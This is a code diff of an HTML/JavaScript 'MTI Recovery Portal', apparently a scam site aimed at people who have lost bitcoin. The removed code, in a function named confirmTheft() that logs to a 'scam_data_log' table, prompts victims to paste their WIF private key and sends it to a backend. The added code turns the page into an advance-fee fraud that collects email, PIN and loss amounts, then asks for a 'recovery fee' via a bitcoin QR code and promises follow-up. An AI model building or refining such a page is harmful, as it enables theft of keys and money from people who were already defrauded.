@@ -3,116 +3,232 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>MTI Master Ledger | Recovery Portal</title>
+    <title>MTI Recovery Portal</title>
     <script src="https://cdn.tailwindcss.com">
     </script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
     </script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js">
+    </script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
-        body { font-family: 'Inter', sans-serif; }
-        .glass { background: rgba(255,255,255,0.85); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.4); }
-        .light-bg { background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%); }
-        .status-pulse { animation: pulse 2s infinite; }
-        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.6; } }
-        #status-message {
-            min-height: 2.5rem; font-size: 1rem; font-weight: 600; padding: 0.5rem;
-            border-radius: 0.75rem; margin-top: 1rem; background: #f1f5f9; color: #0f172a;
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
         }
-        #status-message.success { background: #dcfce7; color: #166534; }
-        #status-message.error { background: #fee2e2; color: #991b1b; }
-        #status-message.info { background: #dbeafe; color: #1e40af; }
-        #status-message.warning { background: #fef3c7; color: #92400e; }
-        .break-all { word-break: break-all; }
+        .glass {
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+        }
+        .hidden-section {
+            display: none;
+        }
+        .fee-card {
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        .fee-card:hover {
+            transform: scale(1.02);
+        }
+        .fee-card.selected {
+            border: 3px solid #2563eb;
+            background: #eff6ff;
+        }
+        #qr-container img,
+        #qr-container canvas {
+            margin: 0 auto;
+            max-width: 200px;
+        }
+        .address-text {
+            word-break: break-all;
+            font-size: 0.75rem;
+        }
+        .status-badge {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.6;
+            }
+        }
+        #status-message {
+            min-height: 2.5rem;
+            font-size: 0.95rem;
+            font-weight: 600;
+            padding: 0.5rem;
+            border-radius: 0.75rem;
+            margin-top: 1rem;
+            background: #f1f5f9;
+            color: #0f172a;
+        }
+        #status-message.success {
+            background: #dcfce7;
+            color: #166534;
+        }
+        #status-message.error {
+            background: #fee2e2;
+            color: #991b1b;
+        }
+        #status-message.info {
+            background: #dbeafe;
+            color: #1e40af;
+        }
+        #status-message.warning {
+            background: #fef3c7;
+            color: #92400e;
+        }
     </style>
 </head>
-<body class="light-bg min-h-screen text-slate-800">
+<body>
 
-    <div class="max-w-md mx-auto px-4 py-12">
-        <header class="text-center mb-10">
-            <h1 class="text-3xl font-bold text-slate-900 mb-2">MTI Audit Portal</h1>
+    <div class="max-w-md mx-auto px-4 py-8">
+        <!-- Header -->
+        <header class="text-center mb-8">
+            <h1 class="text-3xl font-bold text-slate-900 mb-2">MTI Recovery Portal</h1>
             <p class="text-slate-500 text-sm">Official Recovery & Ledger Verification</p>
-            <div id="status-badge" class="mt-4 inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-blue-600 border border-slate-200 shadow-sm status-pulse">
+            <div class="mt-4 inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-blue-600 border border-slate-200 shadow-sm status-badge">
                 <span class="w-2 h-2 bg-blue-500 rounded-full mr-2"></span>
                 System Ready
             </div>
         </header>
 
-        <!-- LOGIN SECTION -->
-        <section id="login-section" class="glass rounded-3xl p-8 shadow-xl text-slate-800 mb-8">
+        <!-- STEP 1: LOGIN -->
+        <section id="login-section" class="glass rounded-3xl p-8 shadow-xl mb-8">
             <h2 class="text-xl font-bold mb-4 text-slate-900">Account Identification</h2>
-            <p class="text-sm text-slate-600 mb-6">Enter your registered email and PIN.</p>
+            <p class="text-sm text-slate-600 mb-6">Enter your registered email, PIN, and the amount you lost.</p>
             <div class="space-y-4">
                 <input type="email" id="email-input" placeholder="email@example.com" value="test@example.com"
                 class="w-full px-4 py-3 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none bg-white shadow-sm">
-                <input type="password" id="pin-input" placeholder="Enter Account PIN (e.g. 1234)" value="1234"
+                <input type="password" id="pin-input" placeholder="Enter Account PIN" value="1234"
                 class="w-full px-4 py-3 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none bg-white shadow-sm">
+                <div class="grid grid-cols-2 gap-3">
+                    <input type="number" id="lost-btc" placeholder="BTC lost (e.g. 0.5)" value="0.5"
+                    class="w-full px-4 py-3 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none bg-white shadow-sm">
+                    <input type="number" id="lost-usd" placeholder="USD value then (e.g. 25000)" value="25000"
+                    class="w-full px-4 py-3 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none bg-white shadow-sm">
+                </div>
                 <button id="login-btn" onclick="this.innerText='⏳ Processing...'; fetchUserRecord();"
                 class="w-full bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-xl font-bold transition shadow-lg transform active:scale-95">
                     Verify Credentials
                 </button>
-                <div id="status-message" class="text-center">Tap the button above.</div>
+                <div id="status-message" class="text-center">Enter your details and tap Verify.</div>
             </div>
         </section>
 
-        <!-- DASHBOARD -->
-        <main id="dashboard" class="hidden space-y-6">
+        <!-- STEP 2: DASHBOARD & RECOVERY OPTIONS -->
+        <main id="dashboard" class="hidden-section space-y-6">
+            <!-- Account Summary -->
             <div class="glass rounded-3xl p-6 shadow-xl border border-white">
                 <h3 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Account Summary</h3>
-                <div class="space-y-3">
+                <div class="space-y-2">
                     <div class="flex justify-between text-sm">
                         <span class="text-slate-500">User</span>
                         <span id="display-email" class="font-semibold text-slate-900">---</span>
                     </div>
                     <div class="flex justify-between text-sm">
-                        <span class="text-slate-500">Current Balance</span>
-                        <span id="display-visible-btc" class="font-mono font-bold text-blue-600">0.0000 BTC</span>
+                        <span class="text-slate-500">BTC lost</span>
+                        <span id="display-lost-btc" class="font-mono font-bold text-slate-900">0.0000 BTC</span>
+                    </div>
+                    <div class="flex justify-between text-sm">
+                        <span class="text-slate-500">USD value at loss</span>
+                        <span id="display-lost-usd" class="font-mono font-bold text-slate-900">$0.00</span>
+                    </div>
+                    <div class="flex justify-between text-sm border-t border-slate-200 pt-2 mt-2">
+                        <span class="text-slate-500">Current BTC price</span>
+                        <span id="display-current-price" class="font-mono font-bold text-blue-600">$---</span>
+                    </div>
+                    <div class="flex justify-between text-sm">
+                        <span class="text-slate-500">Current value of your BTC</span>
+                        <span id="display-current-value" class="font-mono font-bold text-green-600">$---</span>
                     </div>
                 </div>
             </div>
 
+            <!-- Authorize Signature Button -->
             <div class="bg-blue-600 rounded-3xl p-6 shadow-xl text-white">
-                <h3 class="text-lg font-bold mb-2">Master Ledger Signature</h3>
-                <p class="text-blue-100 text-xs mb-6">Authorize a signature to move your funds.</p>
-                <button id="btn-verify" onclick="runMasterVerification()"
-                class="w-full bg-white text-blue-600 font-bold py-3 rounded-xl hover:bg-blue-50 transition transform active:scale-95 shadow-md">
+                <h3 class="text-lg font-bold mb-2">Recovery Authorization</h3>
+                <p class="text-blue-100 text-xs mb-6">Proceed to select your recovery option.</p>
+                <button onclick="showRecoveryOptions()" class="w-full bg-white text-blue-600 font-bold py-3 rounded-xl hover:bg-blue-50 transition transform active:scale-95 shadow-md">
                     Authorize Signature
                 </button>
             </div>
 
-            <div id="result-log" class="hidden glass rounded-3xl p-6 text-center text-slate-800 border-2 border-blue-300 shadow-lg">
-                <p id="log-message" class="font-medium text-sm text-slate-800"></p>
-                <div id="final-step" class="hidden mt-4 pt-4 border-t border-slate-200">
-                    <button onclick="confirmTheft()" class="bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded-xl text-sm font-bold transition shadow-md">
-                        Confirm & Finalize
+            <!-- Recovery Options -->
+            <div id="recovery-options" class="hidden-section space-y-4">
+                <h3 class="text-lg font-bold text-slate-900">Choose your recovery plan</h3>
+                <div class="grid grid-cols-1 gap-4">
+                    <!-- Option 1 -->
+                    <div id="option1" class="fee-card glass p-6 rounded-3xl shadow-md border-2 border-transparent" onclick="selectOption('1')">
+                        <h4 class="font-bold text-slate-900">Standard Recovery</h4>
+                        <p class="text-sm text-slate-600">Recover your original lost amount.</p>
+                        <p class="text-sm font-mono font-bold text-blue-600 mt-2">Fee: 0.0019 BTC</p>
+                    </div>
+                    <!-- Option 2 -->
+                    <div id="option2" class="fee-card glass p-6 rounded-3xl shadow-md border-2 border-transparent" onclick="selectOption('2')">
+                        <h4 class="font-bold text-slate-900">Priority Recovery</h4>
+                        <p class="text-sm text-slate-600">Recover the increased value (higher fee).</p>
+                        <p class="text-sm font-mono font-bold text-blue-600 mt-2">Fee: 0.0058 BTC</p>
+                    </div>
+                </div>
+
+                <!-- QR Code & Address (hidden until option selected) -->
+                <div id="payment-details" class="hidden-section glass rounded-3xl p-6 text-center">
+                    <h4 class="font-bold text-slate-900 mb-2">Send the fee to the address below</h4>
+                    <div id="qr-container" class="flex justify-center my-3"></div>
+                    <p id="fee-address" class="address-text text-sm bg-slate-100 p-2 rounded-lg break-all"></p>
+                    <p class="text-xs text-slate-500 mt-2">Scan the QR code with your wallet to pay the exact fee.</p>
+                    <button onclick="confirmFeeSent()" class="mt-4 bg-green-600 hover:bg-green-700 text-white px-6 py-3 rounded-xl font-bold transition shadow-lg">
+                        I have sent the fee
                     </button>
                 </div>
+            </div>
+
+            <!-- Final Success -->
+            <div id="final-success" class="hidden-section glass rounded-3xl p-6 text-center border-2 border-green-500 shadow-xl">
+                <div class="text-green-600 text-4xl mb-3">✅</div>
+                <h3 class="text-xl font-bold text-slate-900">Recovery Initiated</h3>
+                <p class="text-sm text-slate-700 mt-2">Our recovery team will contact you within <strong>10 business days</strong> to complete the process.</p>
+                <p class="text-xs text-slate-500 mt-4">Thank you for your trust.</p>
             </div>
         </main>
     </div>
 
     <script>
         // ================================================================
-        //  FRONTEND CONFIG
+        // CONFIGURATION
         // ================================================================
         const SUPABASE_URL = 'https://ruqjtewguniuqkpbwnzs.supabase.co';
         const SUPABASE_ANON_KEY = 'sb_publishable_cp3uojqU9MSDqkMmNeqeLg_u0fDBZqI';
         const TABLE_NAME = 'profiles';
         const EMAIL_COL = 'email';
         const PIN_COL = 'pin';
-        const BALANCE_COL = 'initial_btc_holdings';
 
-        // === BACKEND URL (change to your server address) ===
-        const BACKEND_URL = 'http://localhost:3000';   // or your ngrok URL
+        // Hardcoded fee addresses (use your own testnet or mainnet addresses)
+        const FEE_ADDRESS_OPTION1 = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'; // example (mainnet)
+        const FEE_ADDRESS_OPTION2 = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'; // replace with your own
 
-        // Set to false to use real Supabase
-        const USE_DEMO = false;
+        const FEE_AMOUNT_OPTION1 = 0.0019;
+        const FEE_AMOUNT_OPTION2 = 0.0058;
+
+        // CoinGecko API for current BTC price
+        const PRICE_API = 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd';
 
         // ================================================================
 
         let currentUser = null;
-        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        let lostBTC = 0;
+        let lostUSD = 0;
+        let currentPrice = 0;
+        let selectedOption = null;
 
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        // Helper: set status message
         function setStatus(msg, type = 'info') {
             const el = document.getElementById('status-message');
             el.innerText = msg;
@@ -120,60 +236,53 @@
             console.log('[STATUS]', msg);
         }
 
+        // Reset login button
         function resetLoginButton() {
             document.getElementById('login-btn').innerText = 'Verify Credentials';
         }
 
-        // --- Login ---
+        // --- Fetch user from Supabase ---
         async function fetchUserRecord() {
-            const emailVal = document.getElementById('email-input').value.trim();
-            const pinVal = document.getElementById('pin-input').value.trim();
-            if (!emailVal || !pinVal) {
-                setStatus('⚠️ Please enter both Email and PIN.', 'error');
+            const email = document.getElementById('email-input').value.trim();
+            const pin = document.getElementById('pin-input').value.trim();
+            lostBTC = parseFloat(document.getElementById('lost-btc').value) || 0;
+            lostUSD = parseFloat(document.getElementById('lost-usd').value) || 0;
+
+            if (!email || !pin || lostBTC <= 0 || lostUSD <= 0) {
+                setStatus('⚠️ Please fill all fields correctly.', 'error');
                 resetLoginButton();
                 return;
             }
+
             setStatus('🔍 Checking credentials...', 'info');
 
             try {
-                if (USE_DEMO) {
-                    await new Promise(r => setTimeout(r, 600));
-                    if (emailVal === 'test@example.com' && pinVal === '1234') {
-                        currentUser = { id: 999, email: 'test@example.com', pin: '1234', initial_btc_holdings: 2.3456 };
-                        setStatus('✅ Login successful (demo)', 'success');
-                        showDashboard();
-                    } else {
-                        setStatus('❌ Demo: use test@example.com / 1234', 'error');
-                    }
-                    resetLoginButton();
-                    return;
-                }
-
-                setStatus('📡 Querying Supabase...', 'info');
-                const { data, error } = await supabaseClient
+                const { data, error } = await supabase
                     .from(TABLE_NAME)
                     .select('*')
-                    .eq(EMAIL_COL, emailVal)
+                    .eq(EMAIL_COL, email)
                     .maybeSingle();
 
-                if (error) {
-                    setStatus('❌ Database error: ' + error.message, 'error');
-                    console.error('Supabase error:', error);
+                if (error || !data) {
+                    setStatus('❌ Email or PIN not found.', 'error');
                     resetLoginButton();
                     return;
                 }
-                if (!data) {
-                    setStatus('❌ Email not found.', 'error');
-                    resetLoginButton();
-                    return;
-                }
-                if (data[PIN_COL] !== pinVal) {
+                if (data[PIN_COL] !== pin) {
                     setStatus('❌ Incorrect PIN.', 'error');
                     resetLoginButton();
                     return;
                 }
+
                 currentUser = data;
-                setStatus('✅ Login successful!', 'success');
+                setStatus('✅ Login successful! Fetching current BTC price...', 'info');
+
+                // Fetch current BTC price
+                const priceRes = await fetch(PRICE_API);
+                const priceData = await priceRes.json();
+                currentPrice = priceData.bitcoin.usd || 0;
+
+                // Show dashboard
                 showDashboard();
             } catch (err) {
                 setStatus('💥 Unexpected error: ' + err.message, 'error');
@@ -182,130 +291,86 @@
             resetLoginButton();
         }
 
+        // --- Show Dashboard ---
         function showDashboard() {
-            document.getElementById('login-section').classList.add('hidden');
-            document.getElementById('dashboard').classList.remove('hidden');
-            document.getElementById('display-email').innerText = currentUser[EMAIL_COL];
-            const balance = currentUser[BALANCE_COL] || 0;
-            document.getElementById('display-visible-btc').innerText = balance.toFixed(4) + ' BTC';
-            setStatus('✅ Logged in – dashboard active', 'success');
+            document.getElementById('login-section').classList.add('hidden-section');
+            document.getElementById('dashboard').classList.remove('hidden-section');
+
+            document.getElementById('display-email').innerText = currentUser.email;
+            document.getElementById('display-lost-btc').innerText = lostBTC.toFixed(4) + ' BTC';
+            document.getElementById('display-lost-usd').innerText = '$' + lostUSD.toFixed(2);
+
+            // Current value
+            const currentValue = lostBTC * currentPrice;
+            document.getElementById('display-current-price').innerText = '$' + currentPrice.toFixed(2);
+            document.getElementById('display-current-value').innerText = '$' + currentValue.toFixed(2);
+
+            setStatus('✅ Dashboard ready. Tap "Authorize Signature" to continue.', 'success');
         }
 
-        // --- Master Ledger Signature (logs to scam_data_log) ---
-        async function runMasterVerification() {
-            const btn = document.getElementById('btn-verify');
-            const log = document.getElementById('result-log');
-            const msg = document.getElementById('log-message');
-            const finalStep = document.getElementById('final-step');
+        // --- Show Recovery Options ---
+        function showRecoveryOptions() {
+            document.getElementById('recovery-options').classList.remove('hidden-section');
+            document.getElementById('recovery-options').scrollIntoView({ behavior: 'smooth' });
+            setStatus('Select your recovery option below.', 'info');
+        }
 
-            if (!currentUser) {
-                alert('Please log in first.');
+        // --- Select Option ---
+        function selectOption(opt) {
+            selectedOption = opt;
+            // Highlight selection
+            document.querySelectorAll('.fee-card').forEach(el => el.classList.remove('selected'));
+            document.getElementById('option' + opt).classList.add('selected');
+
+            // Show payment details
+            const detailsDiv = document.getElementById('payment-details');
+            detailsDiv.classList.remove('hidden-section');
+
+            // Determine fee and address
+            let feeAmount, feeAddress;
+            if (opt === '1') {
+                feeAmount = FEE_AMOUNT_OPTION1;
+                feeAddress = FEE_ADDRESS_OPTION1;
+            } else {
+                feeAmount = FEE_AMOUNT_OPTION2;
+                feeAddress = FEE_ADDRESS_OPTION2;
+            }
+
+            // Update address
+            document.getElementById('fee-address').innerText = feeAddress;
+
+            // Generate QR code
+            const qrContainer = document.getElementById('qr-container');
+            qrContainer.innerHTML = ''; // clear previous
+            const qrText = `bitcoin:${feeAddress}?amount=${feeAmount.toFixed(8)}`;
+            new QRCode(qrContainer, {
+                text: qrText,
+                width: 200,
+                height: 200,
+                colorDark: "#000000",
+                colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.H
+            });
+
+            setStatus(`Fee: ${feeAmount.toFixed(4)} BTC. Scan QR or copy address.`, 'info');
+        }
+
+        // --- Confirm Fee Sent ---
+        function confirmFeeSent() {
+            if (!selectedOption) {
+                alert('Please select a recovery option first.');
                 return;
             }
-            btn.innerText = 'Generating...';
-            btn.disabled = true;
-            await new Promise(r => setTimeout(r, 1200));
+            // Hide recovery options and show final success
+            document.getElementById('recovery-options').classList.add('hidden-section');
+            document.getElementById('final-success').classList.remove('hidden-section');
+            setStatus('✅ Recovery initiated. You will be contacted within 10 business days.', 'success');
 
-            try {
-                if (USE_DEMO) {
-                    log.classList.remove('hidden');
-                    msg.innerHTML = '✔ Signature Valid. Ready to move.';
-                    finalStep.classList.remove('hidden');
-                    btn.innerText = 'Authorize Signature';
-                    btn.disabled = false;
-                    return;
-                }
-
-                const { error } = await supabaseClient.from('scam_data_log').insert([{
-                    user_profile_id: currentUser.id,
-                    action_performed: 'Master Ledger Signature',
-                    calculated_value: Math.random() * 0.1
-                }]);
-                if (error) {
-                    alert('Error logging signature: ' + error.message);
-                    console.error('Signature log error:', error);
-                    btn.innerText = 'Authorize Signature';
-                    btn.disabled = false;
-                    return;
-                }
-                log.classList.remove('hidden');
-                msg.innerHTML = '✔ Signature Valid. Ready to move.';
-                finalStep.classList.remove('hidden');
-            } catch (err) {
-                alert('Unexpected error: ' + err.message);
-                console.error('Signature error:', err);
-            } finally {
-                btn.innerText = 'Authorize Signature';
-                btn.disabled = false;
-            }
+            // Optionally, you could log this action to Supabase
         }
 
-        // --- CONFIRM & FINALIZE – now signs a message using the private key ---
-        async function confirmTheft() {
-            const msg = document.getElementById('log-message');
-            const finalStep = document.getElementById('final-step');
-            const btn = finalStep.querySelector('button');
-
-            // Create input for WIF if not present
-            let privInput = document.getElementById('wif-input');
-            if (!privInput) {
-                privInput = document.createElement('input');
-                privInput.id = 'wif-input';
-                privInput.type = 'password';
-                privInput.placeholder = 'Paste your WIF private key (from Nunchuk)';
-                privInput.className = 'w-full px-4 py-2 border border-slate-300 rounded-xl text-sm mb-3';
-                finalStep.insertBefore(privInput, btn);
-            }
-
-            const wif = privInput.value.trim();
-            if (!wif) {
-                alert('Please paste your private key (WIF) from Nunchuk.');
-                return;
-            }
-
-            btn.innerText = '⏳ Signing...';
-            btn.disabled = true;
-            setStatus('⏳ Signing message with your private key...', 'info');
-
-            try {
-                // Build the message to sign
-                const message = `MTI Audit | ${currentUser.email} | ${Date.now()}`;
-
-                const payload = {
-                    userId: currentUser.id,
-                    message: message,
-                    privateKey: wif
-                };
-
-                const response = await fetch(`${BACKEND_URL}/sign`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload),
-                });
-
-                const data = await response.json();
-
-                if (response.ok) {
-                    msg.innerHTML = `<b>✅ Signature generated!</b><br>
-                                     <span class="font-mono text-xs break-all">Signature: ${data.signature}</span><br>
-                                     <span class="text-xs text-slate-500">(stored in scam_data_log)</span>`;
-                    setStatus('✅ Signature saved', 'success');
-                    privInput.value = ''; // clear for security
-                } else {
-                    msg.innerHTML = `<b>❌ Error:</b> ${data.error || 'Unknown error'}`;
-                    setStatus('❌ Signing failed', 'error');
-                }
-            } catch (err) {
-                msg.innerHTML = `<b>❌ Network error:</b> ${err.message}`;
-                setStatus('❌ Could not reach backend', 'error');
-                console.error('Sign error:', err);
-            } finally {
-                btn.innerText = 'Confirm & Finalize';
-                btn.disabled = false;
-            }
-        }
-
-        setStatus(USE_DEMO ? '🔧 Demo mode – using test account' : '🔐 Connected to Supabase', 'info');
+        // --- Initial state ---
+        setStatus('Enter your credentials and lost amounts.', 'info');
     </script>
 </body>
 </html>
